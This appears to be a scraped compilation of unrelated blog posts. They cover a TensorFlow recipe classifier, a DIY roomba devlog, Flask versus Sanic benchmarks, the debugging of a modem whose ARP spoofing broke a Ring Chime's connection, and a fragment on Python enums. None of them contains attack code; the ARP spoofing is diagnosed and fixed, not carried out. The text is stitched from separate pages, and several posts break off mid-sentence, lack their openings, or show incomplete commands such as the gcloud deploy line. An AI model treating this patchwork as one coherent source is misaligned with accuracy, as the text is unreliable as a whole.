<p>Next I needed a way to scale the data. Some recipes make 2 giant cakes, while others make a small loaf of bread. Converting all ingredient amounts to the same scale will ensure my model doesn’t give more weight to bigger recipes. I decided to scale amounts by converting each ingredient to a percentage of the total recipe. To do this I took the sum of each row, and then divided each ingredient by the sum to get its percentage. The bread recipe in the screenshot above becomes:</p>

<p><img src="https://sararobinson.dev/assets/media/scaled_inputs.png" alt="Scaled recipe inputs"></p>

<p>With my 99 recipes all converted to the same unit and scaled to percentages, it’s time to build and train a model.</p>

<h2 id="building-a-tensorflow-model">Building a TensorFlow model</h2>

<p>I’m going to use TensorFlow’s <a href="https://www.tensorflow.org/api_docs/python/tf/keras" target="_blank">Keras API</a> for this model, which makes the model code pretty short:</p>

<figure><pre><code data-lang="python"><span>model</span> <span>=</span> <span>tf</span><span>.</span><span>keras</span><span>.</span><span>Sequential</span><span>([</span>
  <span>tf</span><span>.</span><span>keras</span><span>.</span><span>layers</span><span>.</span><span>Dense</span><span>(</span><span>16</span><span>,</span> <span>input_shape</span><span>=</span><span>(</span><span>num_ingredients</span><span>,)),</span>
  <span>tf</span><span>.</span><span>keras</span><span>.</span><span>layers</span><span>.</span><span>Dense</span><span>(</span><span>16</span><span>,</span> <span>activation</span><span>=</span><span>'relu'</span><span>),</span>
  <span>tf</span><span>.</span><span>keras</span><span>.</span><span>layers</span><span>.</span><span>Dense</span><span>(</span><span>3</span><span>,</span> <span>activation</span><span>=</span><span>'softmax'</span><span>)</span>                
<span>])</span></code></pre></figure>

<p>My model output is a softmax array, which means it’ll output the probability a particular recipe is a bread, cake, or cookie (in that order). Softmax means that all the probabilities will add to 1. So a 97% confident bread prediction would look like the following:</p>

<figure><pre><code data-lang="python"><span>[</span><span>.97</span><span>,</span> <span>.02</span><span>,</span> <span>.01</span><span>]</span></code></pre></figure>

<p>After training, my model has reached 90% accuracy. Pretty cool! But can I trust it, or is it overfitting the training data?</p>

<p>🚨This is definitely not an ML best practice, but I will be testing my model on real-world, production data. Mostly because I got tired of copying enough recipes into my spreadsheet to make a test set. Do not try this at home 🚨</p>

<p>To test the model, I made up the following recipe:</p>

<ul>
  <li>Flour: 1 c</li>
  <li>Sugar: 1 c</li>
  <li>Salt: ½ tsp</li>
  <li>Eggs: 1</li>
  <li>Butter: 1 c</li>
</ul>

<p>The model predicts cookies with 84% confidence. Sounds reasonable. What about an edge case, like a bread without yeast or sourdough starter? Let’s try:</p>

<ul>
  <li>Flour: 4 c</li>
  <li>Salt: ½ tsp</li>
  <li>Water: 1.2 c</li>
  <li>Oil: 3 tsp</li>
  <li>Baking powder: 2 tsp</li>
</ul>

<p>My model says bread with 99% confidence, nice! If I instead wrote a series of if statements to handle that edge case, you can see how it would quickly get very long.</p>

<h2 id="deploying-the-model-to-ai-platform">Deploying the model to AI Platform</h2>

<p>I don’t want to be the only one who gets to use this model, so it’s time to deploy it. I’m going to deploy it to Google Cloud <a href="https://cloud.google.com/ai-platform/prediction/docs" target="_blank">AI Platform Prediction</a>. In order to do that, I need to use the TensorFlow <code>model.save()</code> method to save my model assets to a Cloud Storage Bucket. Then I can use gcloud to deploy my model from the command line, pointing it at the bucket path of my saved model.</p>

<p>When you save your TensorFlow model, you can pass it a local filepath or a Cloud Storage bucket. Here I’ll pass it my GCS bucket directly:</p>

<figure><pre><code data-lang="python"><span>model</span><span>.</span><span>save</span><span>(</span><span>'gs://my_gcs_bucket/path'</span><span>)</span></code></pre></figure>

<p>With that, I’m ready to deploy using gcloud (you can also deploy via the UI or the API):</p>

<figure><pre><code data-lang="python"><span>!</span><span>gcloud</span> <span>ai</span><span>-</span><span>platform</span> <span>versions</span> <span>create</span> <span>'v1'</span> \

<span>--</span><span>framework</span> <span>TENSORFLOW</span> \
<span>--</span><span>python</span><span>-</span><span>version</span> <span>3.7</span></code></pre></figure>

<p>When your model has deployed, you’ll see it in your cloud console like this:</p>

<h2 id="building-a-web-app">Building a web app</h2>

<p>🙏 <em>Shout out to my teammate <a href="https://twitter.com/_davideast" target="_blank">David</a> for his help on the web app</em> 🙏</p>

<p>It would be fun if I had a basic web app to get predictions on my model. That way I could quickly experiment with different ingredient ratios. Remember that my model needs the ingredient inputs all converted to cups and then scaled as percentages of the total recipe. It would be mean if I made people do those calculations on their own, so this should probably be handled server side – a great use for <a href="https://cloud.google.com/functions" target="_blank">Cloud Functions</a>:</p>

<p><img src="https://sararobinson.dev/assets/media/arch-diagram.png" alt="Architecture diagram"></p>

<p>I’ll use the Python runtime and write a function that takes the ingredient inputs in their user-friendly units and converts them to cups and then to percentages. From the same function I can send that scaled input to my model and return a nice, readable prediction to the web app. A snippet of the function is below, and you can find it all in <a href="https://gist.github.com/sararob/1fb9fb132a93bdda95f7a71d2afd38ad" target="_blank">this gist</a>.</p>

<p>And here’s the app! I will preface this by saying that I’m lucky to work with amazingly talented people. I <a href="https://twitter.com/SRobTweets/status/1255213096718786568" target="_blank">tweeted</a> an early version of this web app and <a href="https://twitter.com/_davideast" target="_blank">David</a> volunteered to make it look, well, a lot better:</p>

<p>If you want to play around with it yourself, <strong><a href="https://whatareyoubaking.com/" target="_blank">it’s here</a></strong>. I’m sure you’ll try to do something weird with it (this is the internet after all), just keep in mind that the model has been trained on minimal data and it only knows about 3 things: bread, cake, and cookies. So if you enter the ingredients for a brownie or anything else, it’ll do its best to slot it into the only 3 categories it knows about. Think of it …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I spent the last few months making a roomba. I mean, sorta. I made a robot that wanders around and ostensibly vacuums as it goes. But it gets stuck on things all the time, and the floor isn’t particularly clean by the time it runs out of batteries. Nevertheless, it was an experience<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> and I learned a lot, so I though it would be a good idea to document. Consider the following a devlog, one that might be interesting for the historical record — but which I don’t suggest following to build your own roomba.</p>
<p>This all started when I googled for “fun robot projects,” and came across this <a href="https://www.youtube.com/watch?v=FUUPcwtkDQw">terrible video</a>. It goes through building a little roomba life-hack-style, which is to say, in absolutely no detail but vaguely making the whole procedure look simple. They use some cardboard and a cup-noodle container, so I thought “how hard could this be?” What I didn’t notice at the time was how the thing they build is not the thing they demo, nor how there are crucial components that are completely disconnected. As it happens, this video is completely smoke and mirrors.</p>
<p>I’d picked up some motors and a motor controller for a previous, <a href="https://sandymaguire.me/blog/mastery-skateboard/">ill-fated project</a>. And I had an old sonar module lying around in order to do the range finding. So I figured all that was left was a cup-noodles container and a fan, and I’d be on my merry way.</p>
<p>Stupidly, I decided I wasn’t going to make this thing out of cardboard. I was going to design and 3D print the chassis and all of the fiddly little bits it would require. My 3D printer’s bed is 22cm square, which meant anything I wanted to make was going to need to be smaller than that. My first prototype was shaped like a flying disc, with a hole in the middle to put the noodles container, but I learned the hard way that there simply wasn’t enough floor-space on the disc to fit all of the necessary electronics. Back to the drawing board.</p>
<p>I farted around with the base plate design for like a month, trying things. In the meantime, I picked up some CPU fans, assuming that all fans are made equally. This is not true — CPU fans are good at moving air, but not good at, uh… pressurizing air? or something? The idea is that a CPU fan won’t force air somewhere it doesn’t want to go, for example, into a vacuum bag. For that you want a blower fan, but I spent $50 buying the wrong sorts of fans on amazon before I figured this out.</p>
<p>Fans are measured in CFM, which is some sort of non-standardized measurement of “cubic feet per minute.” How much more imperial can you get? Non-standardized here means that all fan manufactures have a different procedure for measuring the CFM, so you can’t just compare numbers. That would be too easy.</p>
<p>It took many weeks of not having my roomba suck enough before I realized that fans move a constant <em>volume</em> of air, <strong>not</strong> a constant <em>mass.</em> The difference is that, unless you have really good intake to your fan, it’ll just make your vacuum chamber really low pressure, and not actually translate into sucking hard at the nozzle. I sorta worked around this by just mounting the fan directly above the vacuum bag, which had a small cut-out to pull debris through. Pipes seem to be anathema to small fans that you’re trying to use as vacuum pumps.</p>
<p>I tried using some agitators to improve my suction by getting things moving. My first attempt was via a gear train that I didn’t realize was 10RPM — way too damn slow to get anything moving. I didn’t feel like waiting around for another amazon shipment, so I just tried running my 12V 2000RPM DC motors at 3V. It sorta worked, but the handmade brushes I built dissolved themselves by still spinning too fast. Since it didn’t seem to improve the suction by much, I ended up scrapping this idea.</p>
<p>While trying to prototype something together with alligator clamps, I accidentally shorted my battery and caused no-small amount of smoke and did some unintentional welding. Thankfully it didn’t explode! I <em>was</em> doing stupid, unsafe things with the battery, but I learned the wrong lesson from this — that I should properly solder all of my connections, even when prototyping. What I should have learned instead was to make a really safe breakout connector for my battery, and then play fast and loose with crimps and connectors from there. But I didn’t yet know about crimps and connectors, so I just hand-soldered everything. It took forever and my productivity went asymptotically towards zero. Especially because I didn’t yet know what I was making, so there was a <em>lot</em> of soldering and desoldering and resoldering.</p>
<p>To make things worse, I kept 3D printing half-figured out chassis — each one of which took like nine hours to print. Inevitably some part wouldn’t fit, or the suction would be off, or some other problem would arise. Cardboard next time, my dude.</p>
<p>Oh, and did I mention that I don’t know how to connect physical things, so I just ended up hot-glueing everything together? Like, <em>everything.</em></p>
<p>One day I was hanging out on IRC, describing my project when Julia Longtin said “oh my god STOP. You’re going to burn down your house!” She had correctly noticed that I hadn’t put a battery management system in front of my battery. If you’re a hobbyist like I am, you might not know that LiPo batteries have a bad habit of catching on fire when you charge them after letting their voltage drop too low. A BMS board watches the voltage on the battery and cuts the circuit before it gets dangerously low. When testing this thing (after the BMS was installed,) it turned off quite often, so I’m pretty sure Julia saved me a ton in fire insurance claims. Thanks Julia!</p>
<p>The roomba’s only sensor is a sonar module that shoots sound waves and listens to hear when they come back. It’s essentially echo-location, like what bats have. Unfortunately for me, we also have the expression “blind as a bat,” which pretty adequately describes the robot. Sonar is a neat idea in theory, but in practice it only reliably works up to about a foot in front, and cloth-covered things like sofas muffle it. When added to the fact that DC motors offer no feedback if they’re stalled, it meant my roomba couldn’t detect if it were moving down a long hallway or stuck trying to drive into the couch. These are two scenarios you really want different behaviors for.</p>
<p>But even worse, due to my design and the limitations of my 3D printer bed, I couldn’t figure out how to fit the wheels inside the robot and still get all of the electronics and vacuum supplies on-board. As a compromise, the rubber tires jut out about two centimeters. Which is just about ideal for getting caught on chair legs and errant cables and walls and stuff like that. So if he hit the wall at a 45 degree angle, he’d just get wedged there. And at 45 degrees, sonar just bounces off of walls and doesn’t return, so again, you don’t know you’re stuck.</p>
<p>What a piece of work.</p>
<p>The software on this thing is a big state machine with things like “drive forward” and “bounce off of driving straight into the wall” and “try relocate because you’ve been stuck in the couch for too long.” I expected the software to be the easiest part of this project, since I’m an ex-professional software engineer. But not so! Even after you discount the time I accidentally melted my Arduino — by… well, I’m not sure what, but definitely related to plugging it into the computer — the software didn’t go smoothly. Arduino has this annoying forced event loop where it calls <code>loop()</code> just as fast as it can, and you can push back with a <code>delay(long milliseconds)</code> function call. But it’s all in C++ (but without the STL) and so getting any real work done is annoying. And have you ever tried to write a proper state machine without algebraic data types? I walked away with the impression that I’m going to need to do a lot of work improving the software end of things before I do another serious project with Arduino.</p>
<p>In short, I spent a few months accidentally setting stuff on fire, waiting too long for the wrong 3D shapes to print, and I all I got was this stupid T-shirt. But I guess that’s what learning feels like. But I’ve already bought a LIDAR module and some bumpers for mk 2, so maybe I’m just a glutton for punishment.</p>
<p>If you’re curious about actually building this thing, here’s all of the source materials. But please, do yourself a favor and don’t put yourself through the mental turmoil of trying to get it to work.</p>

<p>The whole thing is written in a Haskell DSL for 3D printing called <a href="http://www.implicitcad.org/">ImplicitCAD</a>, because of course it is. Have you met me? The source code is available <a href="https://github.com/isovector/cad-models/blob/9a4eb494690293ee5c42859da1ae96d2b99b6840/src/Roomba3.hs">here</a>, where everything definition prefixed with <code>final_</code> needs to be printed.</p>
<p>Oh yeah, and even after being very careful to model the negative space necessary for the fan’s exhaust, I forgot to connect that to the body of the roomba, so I needed to cut the exhaust hole out with my soldering iron. The resulting smoke was pretty noxious, so I just tried to not breathe too hard.</p>

<p>What’s labeled as the voltage source here should instead be the BMS. And no promises that the pins on the Arduino correspond exactly with what the source code actually does. I think it’s right, but the roomba might drive backwards.</p>

<p>A realistic look at Python web frameworks</p>
</blockquote>
<p>If you take a look around the blogosphere at various benchmarks for Python web frameworks, you might start to feel pretty bad about your own setup. Or, alternatively, super-hyped about the possibilities.</p><p>Consider, for instance, the incredible work of the guys at <a href="https://magic.io/blog/uvloop-blazing-fast-python-networking/">magic stack</a>, getting <strong>100,000 requests per second</strong> from <a href="https://github.com/MagicStack/uvloop">uvloop</a> in a single thread. This is on par with compiled language like Go's performance.</p><p>But that benchmark doesn't really cover a fully fleshed out web framework, right? We need a lot more functionality and structure from our frameworks than reading and writing bytes. What about fully fleshed-out web-frameworks in python?</p><p>One such framework is <a href="https://github.com/sanic-org/sanic">Sanic</a>, which again has been shown to have similar performance: <strong>100,000</strong> requests per-second. Or there's <a href="https://vibora.io/">Vibora</a>. Not only does this claim to be a drop-in replacement for <a href="https://github.com/pallets/flask">Flask</a>, but it also has its own templating engine. And it handles <strong>350,000 requests per second</strong>!</p><p>Even more mind-blowing is <a href="https://github.com/squeaky-pl/japronto">Japronto</a> which claims an insane <strong>1.2 million requests per-second</strong> in a single thread 🤯 trouncing the performance of other languages and frameworks:</p><p><img src="https://raw.githubusercontent.com/squeaky-pl/japronto/master/benchmarks/results.png" alt="https://github.com/squeaky-pl/japronto"></p><p>Recently we've been doing a lot of work improving the performance of our Python APIs. Currently we're running <a href="https://github.com/pallets/flask">Flask</a>, and we initially had a single question: <em>how can we serve more requests from a single worker thread? </em>But looking at these benchmarks had us asking more:</p><ol><li>Can we meaningfully compare them to our setup?</li><li>How realistic are they for a full production application?</li><li>Would we be better using one of these frameworks over Flask?</li></ol><p>In other words, how much should we trust these benchmarks? And to what extent should they influence our choice of technology?</p><p>In order to answer these questions, in this post, I benchmark a realistic Flask application along with it's <a href="https://github.com/sanic-org/sanic">Sanic</a> equivalent. I'm going to guess that most readers come from a background with one of the more "traditional" Python frameworks (<a href="https://github.com/pallets/flask">Flask</a> or <a href="https://www.djangoproject.com/">Django</a>), and it's certainly more relevant to devs here at Suade Labs. For this reason, I run the Flask app in a number of different ways, to see what the best bang for our buck is: how performant can we make our application with (almost) zero changes to the code? Along the way we'll pick up some tips for the original question: <em>how can we serve more requests from a single worker thread?</em></p><p><strong>Sidenote: </strong>if you're new to Python's web frameworks, or its asynchronous libraries, take a look at [1] from the addenda at the bottom of this post for a quick explainer. This post mostly assumes you know these things.</p><h2 id="the-baseline">The baseline</h2><p>First let's run some simple "Hello, World!" benchmarks on our system to get a meaningful baseline for comparison. For reference, the Flask benchmarks on <a href="https://www.techempower.com/benchmarks/#section=data-r18&amp;hw=ph&amp;test=fortune&amp;l=zijzen-f">techempower</a> give 25,000 requests per second.</p><p>Here's our Flask app:</p><pre><code>app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def hello():
    if request.method == "GET":
        return "Hello, World!"

    data = request.get_json(force=True)
    try:
        return "Hello, {id}".format(**data)
    except KeyError:
        return "Missing required parameter 'id'", 400</code></pre><p>I ran it under a variety of conditions. First "raw" via <code>python app.py</code>, and then under <a href="https://gunicorn.org/">Gunicorn</a> with a single <code>sync</code> worker via <code>gunicorn -k sync app:app</code> and finally Gunicorn with a single <a href="https://github.com/gevent/gevent">gevent</a> worker via <code>gunicorn -k gevent app:app</code>. In theory Gunicorn should handle concurrency and dropped connections much better than the raw python, and using the gevent worker should allow us to do asynchronous IO without changing our code [2a]. We also ran these benchmarks under <a href="https://www.pypy.org/">PyPy</a>, which in theory should speed up any CPU-bound code without making any changes (if you haven't heard of PyPy see [2b] in the addenda below for a quick explanation and some terminology).</p><p>And what about Sanic? Well, here's the "rewrite" of our app:</p><pre><code>app = Sanic(__name__)

@app.route("/", methods=["GET", "POST"])
async def hello(request):
    if request.method == "GET":
        return text("Hello, World!")

    data = request.json
    try:
        return text("Hello, {id}".format(**data))
    except KeyError:
        raise InvalidUsage("Missing required parameter 'id'")</code></pre><p>And here are the results:</p><figure><img src="https://suade.org/content/images/2021/01/hello_world-3.png" alt="" srcset="https://suade.org/content/images/size/w600/2021/01/hello_world-3.png 600w, https://suade.org/content/images/size/w1000/2021/01/hello_world-3.png 1000w, https://suade.org/content/images/2021/01/hello_world-3.png 1161w" sizes="(min-width: 720px) 720px"></figure><div><p>Some technical details: I used Python 3.7 with the regular CPython interpreter and Python 3.6 with PyPy 7.3.3. At the time of writing, running 3.6 is the latest PyPy interpreter, and their Python 2.7 interpreter is faster in some edge cases, but as Python 2 is <a href="https://www.python.org/doc/sunset-python-2/">officially dead</a>, I don't believe it productive to benchmark. My system details are available in the addenda [3]. I used <a href="https://github.com/wg/wrk">wrk</a> to actually execute the benchmarks.</p><p>I'll break the results down in two parts. First: Sanic dominates, with 23,000 requests a second, although running our Flask app under Guncorn + gevent and PyPy does a pretty good job at keeping up. Second: what's going on with the performance range for our Flask app?</p></div><p>Under CPython, we see that using Gunicorn quadruples the number of Flask requests per second from 1,000 to 4,000 and using a gevent worker adds a mild (sub 10%) speed boost to this. The PyPy results are more impressive. In the raw test, it is churning through 3,000 requests a second; it received the same 4x speed boost from Gunicorn, getting us to 12,000 requests a second; finally with the addition of gevent, it cranks up to 17,000 requests a second, 17x more than the raw CPython version without changing a single line of code.</p><p>I was quite struck by the fact that gevent had such little effect on the CPython process - probably this is because the CPU is maxed out at this point. On the other hand, it seems that PyPy's better speed means it is still spending time waiting on system calls / IO, even under Gunicorn. Adding gevent to the mix means that it switches between concurrent connections, processing them as fast as the CPU will let it.</p><p>To get a real sense of this, I ran the benchmark whilst monitoring CPU usage. Here's a short test against the raw app under PyPy:</p><figure><img src="https://suade.org/content/images/2021/01/sync_cpu_usage.png" alt="" srcset="https://suade.org/content/images/size/w600/2021/01/sync_cpu_usage.png 600w, https://suade.org/content/images/2021/01/sync_cpu_usage.png 919w" sizes="(min-width: 720px) 720px"></figure><p>You can see that the program hops between CPU cores and rarely utilises 100% of a given core. On the other hand, here's part of a much longer test against the Gunicorn gevent worker under PyPy:</p><figure><img src="https://suade.org/content/images/2021/01/gevent_cpu_usage.png" alt="" srcset="https://suade.org/content/images/size/w600/2021/01/gevent_cpu_usage.png 600w, https://suade.org/content/images/2021/01/gevent_cpu_usage.png 900w" sizes="(min-width: 720px) 720px"></figure><p>Now it's evident that there is no switching between CPU cores (the process has become "sticky") and the individual core is being utilised to a far higher degree.</p><p><strong>Key takeaways</strong>: Sanic wins. PyPy is fast. Run your "traditional" app under Gunicorn.</p><h2 id="realistic-benchmarks">Realistic benchmarks</h2><div><p>The benchmark above, while fun, is pretty meaningless for real-world applications. Let's add some more functionality to our app!</p><p>First, we'll allow users to actually store data in a database, which we'll retrieve via an ORM (in our case <a href="https://www.sqlalchemy.org/">SQLAlchemy</a>, the de-facto stand-alone ORM in python). Second, we'll add input-validation to make sure our users get meaningful error messages, and that we're not accepting junk that crashes our app. Finally we'll add a response marshaller to automate the process of converting our database object to JSON.</p></div><p>We'll write a simple book store app, for a publishing house. We have a number of authors each writing zero or more books in several genres. For simplicity, each book has only a single author, but can have multiple genres - for example we could have a book which is in both the "Existential Fiction" and "Beatnik Poetry" categories. We're going to add 1 million authors to our database and roughly 10 million books. [4]</p><p>Our SQLAlchemy models look a little like this:</p>
<pre><code>class Author(db.Model):
    id = db.Column(UUIDType, primary_key=True)
    name = db.Column(db.String, nullable=False)
    ... # snip!

class Book(db.Model):
    author_id = db.Column(
        UUIDType, db.ForeignKey("author.id"), nullable=False, index=True
    )
    author = db.relationship("Author", backref="books")
    ... # snip!
</code></pre>
<p>To marshal these, we use <a href="https://marshmallow.readthedocs.io/en/stable/">Marshmallow</a>, which is a popular Python marshalling library. Here's an example of the Marshmallow model for the Author overview:</p>
<pre><code>class Author(Schema):
    id = fields.Str(dump_only=True)
    name = fields.Str(required=True)
    country_code = EnumField(CountryCodes, required=True)
    email = fields.Str(required=True)
    phone = fields.Str(required=True)
    contact_address = fields.Str(required=True)
    contract_started = fields.DateTime(format="iso")
    contract_finished = fields.DateTime(format="iso")
    contract_value = fields.Integer()
</code></pre>
<p>In our endpoints these are used for validating input and returning results like so:</p>
<pre><code>@bp.route("/author", methods=["GET", "POST"])
def author():
    """View all authors, or create a new one."""

    if request.method == "GET":
        args = validate_get(marshallers.LimitOffsetSchema())
        limit = args["limit"]
        offset = args["offset"]

        authors = Author.query.limit(limit).offset(offset).all()
        return jsonify(marshallers.authors.dump(authors))

    if request.method == "POST":
        author = Author(**validate_post(marshallers.author))

        db.session.add(author)
        db.session.commit()

        return jsonify({"id": author.id})
</code></pre>
<p>The full source code can be viewed in the <a href="https://github.com/olliemath/async_python">GitHub repo</a>. Here, the thing to note is that <code>marshallers.foo</code> is an instance of a <a href="https://marshmallow.readthedocs.io/en/stable/">Marshmallow</a> schema, which can be used both to validate a Foo input, for instance in a POST request, as well as to marshal Foo instances ready for returning as JSON.</p>
<p>In order to actually perform asynchronous database requests, some fancy footwork is required with patching libraries, which depends on which postgres connector you use. SQLAlchemy does not support this out of the box, and in fact its primary developer has a great post arguing that <a href="https://techspot.zzzeek.org/2015/02/15/asynchronous-python-and-databases/">an async ORM is not always a great idea</a>. Juicy technical details in addenda [5], but beware that just using a Gunicorn gevent worker will not necessarily get you what you want.</p><p>PyPy tends to suffer a performance hit when using C-extensions and libraries instead of pure python, conversely CPython should get a performance boost from the C-based libs. To take account of this I tested two different underlying database connectors: both <a href="https://github.com/psycopg/psycopg2">psycopg2</a> and a …</p></div></section></article></div></div>

<p>A couple of days ago I noticed my Ring Chime was disconnected in the Ring app. After a couple of years happily connected it was time to fulfil the ultimate purpose of both software and hardware: annoy humans.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106320736-2e22fe00-626b-11eb-8e03-8c103614f1ee.png" alt="image"></p>

<p>I went through the reconnection process a couple of times to no luck. I called Ring support, who took me through the same process a couple of times to the same result. But one step in their process yielded an unusual result: if I set up a WiFi hotspot on my phone, the Chime would connect to it!</p>

<p>But when renaming my home WiFi network to have the same name and password as the hospot, the Chime still can’t connect.</p>

<p>All the while my Doorbell has no problems on my WiFi.</p>

<p>After running through all their troubleshooting, Ring support were convinced it had to be related to my router or ISP. This was <em>probably</em> a reasonable conclusion on their part given the hotspot trick worked, but left me unsatisfied: my router runs <a href="https://openwrt.org/">OpenWRT</a>, so I know exactly what it’s doing, and my ISP (<a href="https://www.zen.co.uk/">Zen</a>) have never struck me as the type for shenanigans. Especially not shenanigans which only affect one particular device within the LAN.</p>

<h3 id="stuck">Stuck.</h3>

<p>This is the point I found myself stuck for a couple of days. The Chime reports no diagnostics logs (at least, none that are visible to the customer). More than a little frustrating, and ultimately one of the reasons I’ve only been buying new IOT/smart home devices that are compatible with <a href="https://tasmota.github.io/docs/">Tasmota</a> and <a href="https://homebridge.io/">Homebridge</a> (which along with comparable projects are excellent by the way).</p>

<p>All this aside I could see from my router that the device was connecting to wifi, and was getting an IP address. It seems like the connection was failing when it tried to phone home.</p>

<h3 id="its-got-to-be-dns">It’s got to be DNS.</h3>

<p>I mean come on right? The problem has all the properties you expect to be DNS’ fault. Spooky change that only affects one device? Sounds like DNS. Got an IP and internet connection but can’t phone home? Sounds like DNS. Works on some networks and not others? Surely DNS?</p>

<p>To keep pursuing this theory, I already had a couple of router configuration settings that help me out - DHCPD on my router will always give a fixed address to my Chime (10.0.1.2), and I run BIND on the router too to manage some internal zones so can see every query.</p>

<p>I turned on the <code>querylog</code> option within BIND and looked through the logs for queries from <code>10.0.1.2</code>, expecting maybe a <code>SERVFAIL</code> or something.</p>

<p>But there were no queries, at all. The device connects to wifi, asks for and gets an IP (verified in the DHCPD logs), then disconnects without doing any DNS lookups.</p>

<h3 id="what-should-it-be-doing">What <em>should</em> it be doing?</h3>

<p>At this point I am very confused. For comparison I stand up a wireless hotspot on my macbook and use <a href="https://www.wireshark.org/">Wireshark</a> to see what’s going on, and to be 100% sure I get a connection, link the macbook hotspot to my iPhone’s 4G connection.</p>

<p>As expected it phones home fine when not in my own network, and I now have at least some network logs to investigate.</p>

<p>The logs look as you might expect: get an IP, get the time, look up the ring servers in DNS, and connect.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106329127-d8555280-6278-11eb-9838-58e52ee8c0b2.png" alt="image"></p>

<p>Why can’t it do this on my own network?</p>

<p>At this point I am more than a little confused. I tried a few things in guesswork, like changing the network DNS servers to cloudflare (1.1.1.1) or google (8.8.8.8), or connecting with a static IP address. No luck</p>

<h3 id="bring-out-the-big-guns">Bring out the big guns</h3>

<p>At this point my only remaining thought was to try wireshark on my own laptop when I connect to WiFi and see what happens.</p>

<p>This reveals something <em>weird</em>. Two ARP responses, with different MAC addresses, claiming to be the same IP for my router.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106311707-7affd800-625d-11eb-9345-15550da65e0b.png" alt="image"></p>

<p>This is immediately promising. ARP sits below IP on the networking stack and allows devices to correlate IP addresses with MAC addresses of hardware in the same local network. If you want to send a message to an IP for the first time, you can use ARP to find that machines hardware address in the local network or find the hardware address of a router that will forward on your message.</p>

<p>Sending ARP responses which claim an IP address which isn’t yours is <a href="https://en.wikipedia.org/wiki/ARP_spoofing">ARP Spoofing</a>. It’s at best a pain in the ass, and at worst a security risk, because devices will start sending packets to the wrong place, and that wrong place may be malicious.</p>

<p>Looking at traffic from our imposter’s MAC address we see even more bad form: this device is claiming every IP anyone tries to find.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106311711-7b986e80-625d-11eb-96cf-691c005730b4.png" alt="image"></p>

<p>At this point my working theory is greatly narrowed down. The chime is connecting to wifi, getting an IP address, and then wants to connect to the internet, so uses ARP to find the router.</p>

<p>Our imposter then responds in the affirmative, claiming to be the router, but really doing nothing.</p>

<p>Our chime then sends its first requests to what it thinks to be the router, and after they go unacknowledged, gives up and disconnects.</p>

<p>Most network devices stick around long enough to build up an ARP cache whose entries get invalidated when new ARP messages come in. Over time, this means that though the imposter is claiming IP addresses, the real owner of an IP address sends its own messages, which overwrite the imposter.</p>

<p>In this case, this is probably a shortcoming of the Chime - it does not stick around long enough to see the real owner make itself known. But the chime is just a small corner of the problem now.</p>

<h3 id="who-is-this-imposter">Who is this imposter?</h3>

<p>The first portion of a MAC address is registered to a particular manufacturer. In this case… no dice. The mac address is <code>2a:8a:1c:ea:51:c5</code>. It is now immediately obvious what the problem is!</p>

<p>(Just kidding)</p>

<p>In the address above, the locally administered bit is set, meaning the address is probably randomly generated. (You can spot a MAC address like this because the 2nd digit in hex form is 2, 6, a, or e) https://en.wikipedia.org/wiki/MAC_address#Universal_vs.<em>local</em>(U/L_bit). Unlike other MAC addresses, entries in this spot can be locally generated, unlike other MAC addresses where the first portion is registered to a specific manufacturer.</p>

<p>Luckily, between my devices sits a managed switch, my handy <a href="https://www.tp-link.com/uk/business-networking/smart-switch/t1600g-28ps/">T1600G-28PS</a> (more on that in a bit). Being a managed switch, one feature notes all the MAC addresses coming and going, and associates them in a handy table with which port they are linked into.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106322661-113bfa00-626e-11eb-8d66-fd692ebd14b4.png" alt="image"></p>

<p>Tracking back the device connected to port 13, I find my modem, a Huawei MT992 <a href="https://en.wikipedia.org/wiki/G.fast">g.fast</a> modem.</p>

<p><img src="https://user-images.githubusercontent.com/1965587/106322702-26188d80-626e-11eb-840f-c6d686ed7eb3.png" alt="image"></p>

<p>Usually a modem wouldn’t be connected directly to a switch as only a router needs to speak to it. In my case the switch is UPS backed, and powers the router through a <a href="https://en.wikipedia.org/wiki/Power_over_Ethernet">Power Over Ethernet</a> <a href="https://www.amazon.co.uk/TP-Link-Gigabit-Ethernet-Splitter-TL-PoE10R/dp/B003CFATQK">splitter</a>, so if the power goes out my internet connection &amp; WiFi (also driven by PoE access points) are unaffected.</p>

<p>I had originally isolated the modem into separate <a href="https://en.wikipedia.org/wiki/Virtual_LAN">VLAN</a> based on it’s MAC address. This keeps the router-modem traffic separate from the router-LAN traffic. But as you probably guessed - the spoofed MAC address changes from time to time, and so it snuck out of the VLAN originally envisioned for it, allowing it to spill its ARP-spoofs all over my LAN.</p>

<h3 id="concluding">Concluding</h3>

<p>The fix I have settled with for now is using port-based VLANing. Now regardless of what MAC it uses the modem can only ever talk to the router. The modem won’t be forwarded any ARP requests, and its own announcements will only reach the router.</p>

<p>Longer term the solution should be to connect the router directly to the modem with a PoE injector along the line, but with the VLANs now tightened up this is less urgent.</p>

<p>This was quite the detour given the original problem only manifested on one device. In reality there would have been some connectivity issues for devices connecting within the lan for the first time as all ARP requests would be pointed to the wrong place. However relatively quickly - within milliseconds - the false entries would have been getting invalidated by the real owners, so devices that stayed connected to the network would be routing to the right places.</p>

<p>It’s also quite surprising the modem does this at all given it is an L2 device which <em>doesn’t even speak IP</em>, and its MAC spoofing behaviour is even stranger. There is actually a sticker on the back of the device with a MAC address that it clearly doesn’t use. I have no idea what this MAC address refers to as it is not used on the LAN.</p>

<p>Overall, this served as a big reminder that it is a pain in the ass to debug closed hardware. If you are interested in the IOT space, I really recommend looking at Tasmota, Homebridge, and their equivalents in the DIY smart home space. And likewise, tools like <code>tcpdump</code>, Wireshark, and even the basics like <code>arp</code> are worth learning because you never know when they may be useful.</p>

        <p>2020-11-17</p>

        
<h2 id="problem-1-no-semantics">Problem 1: no semantics</h2>

<p>The fundamental problem with enums is that they don’t have a semantic meaning for the left and right side. Let’s look at an example:</p>

<div><div><pre><code><span>class</span> <span>Fruits</span><span>(</span><span>Enum</span><span>):</span>
    <span>apple</span> <span>=</span> <span>'Apple'</span>
</code></pre></div></div>

<p>It’s not at all clear why the cases of <code>apple</code> and <code>Apple</code> are different here, and what does the difference in case mean? Which of those two do we store in the database for example? Which do we show to the user?</p>

